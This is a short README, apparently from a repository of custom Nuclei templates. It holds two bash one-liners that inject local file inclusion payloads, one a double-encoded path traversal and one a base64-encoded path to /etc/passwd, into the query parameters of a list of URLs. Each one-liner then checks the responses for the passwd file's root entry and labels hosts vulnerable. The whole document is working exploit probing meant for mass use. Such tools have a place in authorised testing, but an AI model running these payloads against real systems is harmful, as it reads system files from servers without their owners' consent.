# custom-nuclei-templates

`double-encoded-lfi`
```
reference: https://twitter.com/nav1n0x/status/1622529068557078528?s=20
cat urls.txt | qsreplace ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd" | while read host do; do curl -s --path-as-is --insecure "$host" | grep -q "root:[x*]:0:0" && echo -e "\033[0;31mVULNERABLE $host\033[0;0m" || echo -e "\033[0;32mNOT VULNERABLE $host\033[0;0m";done
```

`lfi-base64-parameter`
```
reference: https://twitter.com/GodfatherOrwa/status/1617511891362013184?s=20
cat urls.txt | qsreplace "L2V0Yy9wYXNzd2Q=" | while read host do; do curl -s --path-as-is --insecure "$host" | grep -q "root:[x*]:0:0" && echo -e "\033[0;31mVULNERABLE $host\033[0;0m" || echo -e "\033[0;32mNOT VULNERABLE $host\033[0;0m";done
```
